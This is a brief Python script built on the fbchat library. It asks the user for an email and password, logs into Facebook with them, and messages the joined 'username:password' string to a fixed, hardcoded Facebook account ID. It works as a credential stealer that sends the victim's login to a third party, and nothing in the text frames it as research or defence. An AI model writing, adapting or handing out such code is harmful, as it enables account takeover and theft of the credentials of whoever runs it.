import fbchat
from fbchat import Client
from getpass import getpass
username = str(input("mail"))
getpass = str(input("pass"))
message = username+":"+getpass
client = fbchat.Client(username, getpass)
sent = client.send(fbchat.models.Message(message),100025248024301)
